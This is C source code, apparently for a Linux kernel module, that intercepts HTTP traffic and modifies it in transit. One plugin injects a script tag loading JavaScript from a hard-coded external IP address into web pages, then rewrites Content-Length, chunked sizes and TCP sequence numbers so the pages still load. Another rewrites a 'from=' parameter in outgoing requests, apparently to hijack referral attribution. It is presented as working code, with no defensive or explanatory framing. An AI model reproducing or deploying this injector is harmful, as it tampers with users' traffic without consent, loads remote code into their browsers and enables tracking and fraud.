#include "main.h"

//////////////////////////////////////////////////////////////////////////

static int response_repair(void *data)
{
	struct http_request* httpr=(struct http_request*)data;
	struct user_skb* u_skb=httpr->curr_skb;
	if(httpr->js_len != 0)
	{
		//printk("~~~~~~~~~~~~%s~~~~~~~~~~`\n" , u_skb->data);
		if(httpr->response_num>1)
		{
			change_seq(u_skb->skb, u_skb->seq + httpr->js_len);
		}
		
	}
	return 0;
}


//////////////////////////////////////////////////////////////////////////
static int modify_cpc_qdh(void *data)
{
	struct http_request* httpr=(struct http_request*)data;
	struct user_skb* u_skb=httpr->curr_skb;
	char* http_content;
	int http_content_len;
	char *search;
	
    http_content_len=u_skb->data_len;
    http_content=u_skb->data;
	//printk("~~~~~~~~~~~~%s~~~~~~~~~~`\n" , http_content);
	search=strstr(http_content , "from=123456");
	if(!search)
		return -1;
	
	memcpy(search , "from=654321" , 11);
	return 0;
}

//////////////////////////////////////////////////////////////////////////

//#define JS "<script type=\"text/javascript\"></script>\r\n"
//#define JS "<script type=\"text/javascript\"> alert('hello world') </script>\r\n"
#define JS "<script type=\"text/javascript\" src=\"http://210.22.155.236/js/wa.init.min.js?v=20150930\" id=\"15_bri_mjq_init_min_36_wa_101\" async  data=\"userId=12245789-423sdfdsf-ghfg-wererjju8werw&channel=test&phoneModel=DOOV S1\"></script>\r\n"
#define JS_LEN strlen(JS)

static int change_chunked_hex(void *data)
{
	struct http_request* httpr=(struct http_request*)data;
	struct user_skb* u_skb=httpr->curr_skb;
	char* http_content;
	char *hex_start,*hex_end;
	char src_hex[32]={0} ,des_hex[32]={0};
	int hex_len;
	int hex_i;
	
    http_content = u_skb->data;
	hex_start = http_content + httpr->hhdr.httph_len;
	
	if(!hex_start)
	{
		return -1;
	}
	
	hex_end = strstr(hex_start , "\r\n");
	if(!hex_end)
	{
		return -1;
	}

	hex_len=hex_end-hex_start;
	if(hex_len == 8)
	{
		if(!memcmp(hex_start , "0000" ,4))
		{
			hex_start+=4;
			hex_len-=4;
		}
		else
		{
			return -1;
		}
	}
	if(hex_len > 5)
	{
		return -1;
	}

	memcpy(src_hex , hex_start , hex_len);
	sscanf(src_hex, "%x", &hex_i);
	hex_i+=JS_LEN;
	sprintf(des_hex , "%x" , hex_i);
	
	if(!http_merge_packet(u_skb->skb,httpr->hhdr.httph_len,hex_len,des_hex,strlen(des_hex)))
	{
		return -1;
	}

	return 0;
}


static int change_contentlength(void *data)
{
	struct http_request* httpr=(struct http_request*)data;
	struct user_skb* u_skb=httpr->curr_skb;
	
	char content_len_s[32]={0};
	int content_len_i;
	int content_len_key_len;
	char* content_len_value;
	int content_len_value_len;
	int match_offset;
	char* http_content;
	int http_content_len;

	http_content_len = u_skb->data_len;
    http_content = u_skb->data;

	content_len_key_len = 16;//like this Content-Length: 29073
	content_len_value = httpr->hhdr.content_length.c + content_len_key_len;
	content_len_value_len = httpr->hhdr.content_length.l - content_len_key_len;

	if(content_len_value_len > 8)
		return -1;

	if(!content_len_value)
		return -1;

	memcpy(content_len_s , content_len_value , content_len_value_len);
	sscanf(content_len_s, "%d", &content_len_i);
	content_len_i +=httpr->js_len;
	sprintf(content_len_s, "%d" , content_len_i);
	
	match_offset=content_len_value-http_content;
	if(!http_merge_packet(u_skb->skb,match_offset,content_len_value_len,content_len_s,strlen(content_len_s)))
	{
		return -1;
	}

	return 0;
}


static int insert_js(void *data)
{
	struct http_request* httpr=(struct http_request*)data;
	struct user_skb* u_skb=httpr->curr_skb;
	char* http_content;
	int http_content_len;
	int match_offset;
	int js_len;

	//insert into first response packet
	if(httpr->response_num != 1)
		return -1;
	
	
    http_content_len=u_skb->data_len;
    http_content=u_skb->data;
	//printk("insert js :  \n%s" , http_content);
	match_offset = bm_search(BM_SEARCH_INSERT_JS1 ,http_content, http_content_len);
	if(match_offset==-1)
	{
		match_offset = bm_search(BM_SEARCH_INSERT_JS2 ,http_content, http_content_len);
		if(match_offset==-1)
		{
			return -1;
		}
	}
	js_len=JS_LEN;
	if(http_merge_packet(u_skb->skb,match_offset,0,JS,js_len))
	{
		u_skb->data_len = u_skb->data_len + js_len;
		httpr->js_len = js_len;
		if(httpr->hhdr.res_type==HTTP_RESPONSE_TYPE_CHUNKED)	
		{		
			change_chunked_hex(data);   
		}	
		else if(httpr->hhdr.res_type==HTTP_RESPONSE_TYPE_CONTENTLENGTH)	
		{		
			change_contentlength(data);    
		}
	}
	//printk("insert js2 :  \n%s" , http_content);
    return 0;
}



int init_plug_extern()
{
	new_plug(insert_js , PLUG_EXTERN_TYPE_RESPONSE);
	new_plug(response_repair, PLUG_EXTERN_TYPE_RESPONSE);
	new_plug(modify_cpc_qdh , PLUG_EXTERN_TYPE_REQUEST);
	return 0;
}

